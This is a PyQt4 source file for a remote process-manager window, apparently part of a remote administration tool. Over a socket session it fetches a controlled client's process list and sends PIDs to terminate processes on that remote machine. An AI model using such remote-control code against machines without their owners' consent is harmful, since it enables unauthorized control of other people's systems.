from PyQt4.QtGui import *
from PyQt4.QtCore import *
from main_ui import Ui_Form
import ast
import os
import socket
import time

from libs.data_transfer import data_get, data_send
from libs.language import Translate

# Multi Lang
translate = Translate()
_ = lambda _word: translate.word(_word)


class mainPopup(QWidget, Ui_Form):
    def __init__(self, args):
        QWidget.__init__(self)
        self.setupUi(self)

        self.sock = args['sock']
        self.client = args['client']
        self.session_id = args['session_id']
        self.assets = args['assets']

        self.gui = QApplication.processEvents

        self.setWindowTitle(_('MPROCESSES_TITLE'))

        self.set_language()

        self.get_processes_list()

        self.getProcessesButton.clicked.connect(self.get_processes_list)
        self.terminateProcessButton.clicked.connect(self.terminate_process)
        self.alwaysTopButton.clicked.connect(self.always_top)

    def set_language(self):
        self.getProcessesButton.setText(_('MPROCESSES_REFRESH'))
        self.terminateProcessButton.setText(_('MPROCESSES_KILL'))
        self.processesLabel.setText(_('MPROCESSES_COUNT'))
        self.processesTable.horizontalHeaderItem(0).setText(_('MPROCESSES_PID'))
        self.processesTable.horizontalHeaderItem(1).setText(_('MPROCESSES_FILE_NAME'))

    def get_processes_list(self):
        self.processesTable.clearContents()
        try:
            processes = data_get(self.sock, 'getProcessesList', 'proccessMode', session_id=self.session_id, to=self.client)
            processesDict = ast.literal_eval(processes['payload'])
            self.processesTable.setRowCount(len(processesDict))
            for index, pid in enumerate(processesDict):

                # Set PID
                item = QTableWidgetItem(str(pid))
                self.processesTable.setItem(index, 0, item)

                # Set Filename
                item = QTableWidgetItem(processesDict[pid])
                item.setIcon(QIcon(os.path.join(self.assets, 'executable.png')))
                self.processesTable.setItem(index, 1, item)

            self.processesCountLabel.setText(str(len(processesDict)))

        except AttributeError:
            pass
        except socket.error:
            pass

    def terminate_process(self):
        try:
            pid = self.processesTable.item(self.processesTable.currentRow(), 0).text()
            data_send(self.sock, pid, 'proccessMode', session_id=self.session_id, to=self.client)
            time.sleep(1.0)
            self.get_processes_list()
        except AttributeError:
            pass

    def always_top(self):
        if self.alwaysTopButton.isChecked():
            self.setWindowFlags(self.windowFlags() | Qt.WindowStaysOnTopHint)
            self.show()
        else:
            self.setWindowFlags(self.windowFlags() & ~Qt.WindowStaysOnTopHint)
            self.show()

    def closeEvent(self, event):
        pass